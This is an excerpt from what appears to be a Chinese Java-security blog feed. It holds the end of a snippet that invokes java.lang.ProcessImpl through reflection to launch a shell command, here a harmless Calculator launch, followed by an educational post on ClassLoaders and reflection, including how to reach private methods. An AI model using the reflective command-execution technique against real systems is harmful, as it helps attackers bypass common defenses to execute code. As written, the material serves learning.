    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; cmd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;open /System/Applications/Calculator.app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectPI0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.ProcessImpl&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Redirect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;boolean&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; map &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Redirect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; redirect &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; dir &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//第四个参数dir不能为空，为空会失败，表示在哪个路径下执行命令&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; map&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; dir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; redirect&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessImpl&lt;/span&gt; reflectProcess &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessImpl&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;reflectProcess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ReflectPI0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全笔记(1)-反射机制</title>
    <link href="https://jkme.github.io/2022/03/22/java-reflection.html"/>
    <id>https://jkme.github.io/2022/03/22/java-reflection.html</id>
    <published>2022-03-21T16:00:00.000Z</published>
    <updated>2022-04-02T07:38:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-类加载器-ClassLoader"><a href="#0x1-类加载器-ClassLoader" class="headerlink" title="0x1. 类加载器: ClassLoader"></a>0x1. 类加载器: ClassLoader</h2><p>Java是一个依赖于<code>JVM（Java虚拟机)</code>实现的跨平台的开发语言，<code>Java</code>会先通过编译器将源代码转换为Java二进制字节码，一般是保存在<code>.class</code>文件中，之后通过<code>JVM</code>解释器执行这段代码。字节码文件会包含很多Class信息，在JVM解释器运行的过程中，<code>ClassLoader</code>就是用来加载类的，它会将Java字节码中的Class加载到内存中，而每个<code>Class</code>对象内部都有一个<code>ClassLoader</code>属性标识由哪个<code>ClassLoader</code>加载。</p><h3 id="常见的ClassLoader"><a href="#常见的ClassLoader" class="headerlink" title="常见的ClassLoader"></a>常见的ClassLoader</h3><p>一切的<code>Java</code>类都必须经过JVM加载之后才可以运行，最常见的<code>ClassLoader</code>： <code>BootstrapClassLoader</code>、<code>ExtensionClassLoader</code>、<code>AppClassLoader</code>、<code>URLClassLoader</code>、<code>ContextClassLoader</code></p><h4 id="BootstrapClassLoader"><a href="#BootstrapClassLoader" class="headerlink" title="BootstrapClassLoader"></a>BootstrapClassLoader</h4><p>JVM内置的默认<code>classLoader</code>,负责加载JVM运行时的核心类，位于<code>JAVA_HOME/lib/rt.jar/</code>文件夹中，由C代码实现，<code>Bootstrap ClassLoader</code>类加载器所加载的类的ClassLoader时候都会返回null</p><h4 id="ExtClassLoader"><a href="#ExtClassLoader" class="headerlink" title="ExtClassLoader"></a>ExtClassLoader</h4><p>扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 <code>JAVA_HOME/lib/ext/*.jar</code> 中，库名通常以 javax 开头</p><h4 id="AppClassLoader"><a href="#AppClassLoader" class="headerlink" title="AppClassLoader"></a>AppClassLoader</h4><p>应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载<code>ClASSPATH</code>环境变量或者<code>java.class.path</code>属性里定义的路径中的jar包和目录，我们自己编写和使用的第三方Jar包通常都是由它来加载</p><h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p>ClassLoader抽象类的一种实现，它可以根据URL搜索类或资源，并进行远程加载。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">demo1</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JavaClassLoader</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ClassLoader</span> extensionClassLoader <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"App Classloader: "</span> <span class="token operator">+</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parent Classloader: "</span> <span class="token operator">+</span> extensionClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The parent of parent Classloader: "</span> <span class="token operator">+</span> extensionClassLoader<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-none"><code class="language-none">App Classloader: sun.misc.Launcher$AppClassLoader@18b4aac2parent Classloader: sun.misc.Launcher$ExtClassLoader@5cad8086The parent of parent Classloader: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>ClassLoader</code>类有如下常见的方法:</p><ul><li><code>loadClass</code>:参数为需要加载的全限定类名，该方法会先查看目标类是否已经被加载，查看父级加载器并递归调用<code>loadClass()</code>，如果都没找到则调用<code>findClass()</code>。这种寻找类的方式称为<a href="https://www.cnblogs.com/JonaLin/p/12674114.html">双亲委派机制(delegation model)</a>,主要是为了安全性，避免用户自己编写的类动态替换Java的一些核心类，同时也避免了重复加载。<br><img src="/2022/03/22/java-reflection/1.png"><br>双亲委派：<br><img src="/2022/03/22/java-reflection/2.png"></li><li><code>findClass</code>: 搜索类的位置，一般会根据名称或位置加载.class字节码文件，获取字节码数组，然后调用defineClass()。</li><li><code>findloadedClass</code>: 查找JVM已经加载过的类</li><li><code>defineClass</code>: 将字节码转换为JVM的<code>java.lang.Class</code>对象</li></ul><p>代码中关于<code>defineClass</code>还是比较值得一看，<code>loadClass</code>的作用是加载Class文件，转换为字节码，当class不是在文件里面，而是从其它来源的时候，比如网络请求，这个时候就轮到<code>defineClass</code>上场了，<code>defineClass</code>负责把byte[]直接转换为Class，也就是说<code>defineClass</code>是对类加载方式的扩展: </p><blockquote><p> However, some classes may not originate from a file; they may originatefrom other sources, such as the network, or they could be constructed by anapplication.  The method {@link #defineClass(String, byte[], int, int)<tt>defineClass</tt>} converts an array of bytes into an instance of class<tt>Class</tt>. Instances of this newly defined class can be created using{@link Class#newInstance <tt>Class.newInstance</tt>}.</p></blockquote><h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><h4 id="获取Class对象的四种方法"><a href="#获取Class对象的四种方法" class="headerlink" title="获取Class对象的四种方法"></a>获取Class对象的四种方法</h4><p>反射的主要作用是通过Class对象来对类的属性和方法进行获取和调用，包括类的私有方法（protected和private），一般来说有两种方法可以获取类：</p><ol><li><code>obj.getClass()</code>: 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过<code>obj.getClass()</code>来获取它的类 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span> obj <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> c <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><code>Class.forName</code>:  <code>Class c= Class.forName(&quot;java.lang.Runtime&quot;);</code></li><li><code>ClassLoader</code>: <code>Class clazz = Classloader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</code></li><li>原生类.class: <code>Class clazz  = java.lang.Runtime.class;</code></li></ol><p><code>forName</code>有两个函数重载：</p><ul><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code><br>第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token comment">// 等于</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> currentLoader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2022/03/22/java-reflection/6.png"><br>默认情况下，<code>forName</code>的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就是<code>ClassLoader</code>。</li></ul><h2 id="反射调用函数"><a href="#反射调用函数" class="headerlink" title="反射调用函数"></a>反射调用函数</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">student</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"D"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"My name is "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">", My Age is "</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test1</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        student<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//反射调用Student</span>        <span class="token class-name">String</span> class_name <span class="token operator">=</span> <span class="token string">"student.Student"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> func <span class="token operator">=</span> <span class="token string">"sayHello"</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> stu_class <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>class_name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Student</span> stu2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">)</span> stu_class<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>class_name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>stu2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>getDeclaredMethod()</code>: Returns a Method object that reflects the specified declared method of the class or interface represented by this Class object.</li><li><code>getMethod()</code>:         returns a Method object that reflects the specified public member method of the class or interface represented by this Class object.</li></ul><p><code>getDeclaredMethod()</code>可以获取类里面任何方法，<code>getMethod()</code>只可以获取<code>public</code>属性的方法。另外几个比较用的多是是:</p><ul><li><code>getField(String name)</code>: 根据字段名获取对应的字段，只能获取public类型的字段，可以获取父类的字段。</li><li><code>getFields()</code>: 获取类所有的字段，只能获取public类型的字段，可以获取父类的字段。</li><li><code>getDeclaredField(String name)</code>: 根据字段名获取对应的字段，可以获取public、protected和private类型的字段，不能获取父类的字段。</li><li><code>getDeclaredFields()</code>: 获取类所有的字段，包括public、protected和private。不能获取父类的字段。</li></ul><h4 id="通过反射获取修改私有变量"><a href="#通过反射获取修改私有变量" class="headerlink" title="通过反射获取修改私有变量"></a>通过反射获取修改私有变量</h4><p><img src="/2022/03/22/java-reflection/7.png"></p><p><strong>如果字段是staic修饰的时候，在获取和修改字段的时候，可以使用null代替具体对象的stu</strong></p><h4 id="通过反射调用私有方法"><a href="#通过反射调用私有方法" class="headerlink" title="通过反射调用私有方法"></a>通过反射调用私有方法</h4><p><img src="/2022/03/22/java-reflection/8.png"></p><p>如果调用的方法有多个参数，需要以数组的形式传入：<br><img src="/2022/03/22/java-reflection/9.png"></p><ul><li>使用<code>getDeclaredMethod</code>获取多个参数的方法，第二个参数为new Class[]{}类型的数组，数组中每一个值对应参数的class对象。这是一种标准的传参方式，建议即使方法没有参数或者只有一个参数也按照这种方式传参</li><li>使用<code>method.invoke</code>方法对方法进行调用，传递的第二个参数表示实际调用时传递的参数值，类型是Object数组。<br>对于static类型的方法，与字段的使用方法相似，在执行方法时，同样可以把obj对象换成null</li></ul><h4 id="反射获取构造函数"><a href="#反射获取构造函数" class="headerlink" title="反射获取构造函数"></a>反射获取构造函数</h4><p>构造函数是一种特殊的方法，很多情况下需要通过反射获取构造函数，然后通过构造函数生成类的实例。</p><ul><li><code>getConstructor(Class... parameterTypes)</code> 根据参数类型获取对应的构造函数，只能获取public类型的构造函数，不能获取父类的构造函数。</li><li><code>getConstructors()</code> 获取类所有的构造函数，只能获取public类型的字段，不能获取父类的构造函数。</li><li><code>getDeclaredConstructor (Class... parameterTypes)</code> 根据参数类型获取对应的构造函数，可以获取public、protected和private类型的构造函数，不能获取父类的构造函数。</li><li><code>getDeclaredConstructors()</code> 获取类所有的构造函数，包括public、protected和private。不能获取父类的构造函数。</li></ul><p>在获取到构造函数之后，需要通过newInstance函数来生成类对象。关于newInstance的使用如下所示：</p><ul><li><code>newInstance(Object ... initargs)</code>: newInstance函数接受可变的参数个数，构造函数实际有几个传输，这里就传递几个参数值。newInstance返回的数据类型是Object，一般需要强制转换类型。</li></ul><p><img src="/2022/03/22/java-reflection/10.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://javasec.org/javase/Reflection/Reflection.html">javasec.org</a></li><li><a href="https://www.freebuf.com/articles/web/308460.html">Java代码审计之反射</a></li><li><a href="https://github.com/phith0n/JavaThings">Java安全漫谈</a></li><li><a href="https://xz.aliyun.com/t/9002">JAVA安全基础</a></li><li><a href="https://xz.aliyun.com/t/7029/">JAVA反序列化 - 反射机制</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483830&idx=1&sn=39c08c61cbab36ace4ac691e0756948b&chksm=c2a1d53ff5d65c29f9b8310c324c67568fe27e61720baffff8af19ef9cb94f5096d73df0c69f">告别脚本小子系列丨JAVA安全(3)——JAVA反射机制</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-类加载器-ClassLoader&quot;&gt;&lt;a href=&quot;#0x1-类加载器-ClassLoader&quot; class=&quot;headerlink&quot; title=&quot;0x1. 类加载器: ClassLoader&quot;&gt;&lt;/a&gt;0x1. 类加载器: ClassLoader&lt;/h2&gt;&lt;p&gt;Java是一个依赖于&lt;code&gt;JVM（Java虚拟机)&lt;/code&gt;实现的跨平台的开发语言，&lt;code&gt;Java&lt;/code&gt;会先通过编译器将源代码转换为Java二进制字节码，一般是保存在&lt;code&gt;.class&lt;/code&gt;文件中，之后通过&lt;code&gt;JVM&lt;/code&gt;解释器执行这段代码。字节码文件会包含很多Class信息，在JVM解释器运行的过程中，&lt;code&gt;ClassLoader&lt;/code&gt;就是用来加载类的，它会将Java字节码中的Class加载到内存中，而每个&lt;code&gt;Class&lt;/code&gt;对象内部都有一个&lt;code&gt;ClassLoader&lt;/code&gt;属性标识由哪个&lt;code&gt;ClassLoader&lt;/code&gt;加载。&lt;/p&gt;
&lt;h3 id=&quot;常见的ClassLoader&quot;&gt;&lt;a href=&quot;#常见的ClassLoader&quot; class=&quot;headerlink&quot; title=&quot;常见的ClassLoader&quot;&gt;&lt;/a&gt;常见的ClassLoader&lt;/h3&gt;&lt;p&gt;一切的&lt;code&gt;Java&lt;/code&gt;类都必须经过JVM加载之后才可以运行，最常见的&lt;code&gt;ClassLoader&lt;/code&gt;： &lt;code&gt;BootstrapClassLoader&lt;/code&gt;、&lt;code&gt;ExtensionClassLoader&lt;/code&gt;、&lt;code&gt;AppClassLoader&lt;/code&gt;、&lt;code&gt;URLClassLoader&lt;/code&gt;、&lt;code&gt;ContextClassLoader&lt;/code&gt;&lt;/p&gt;
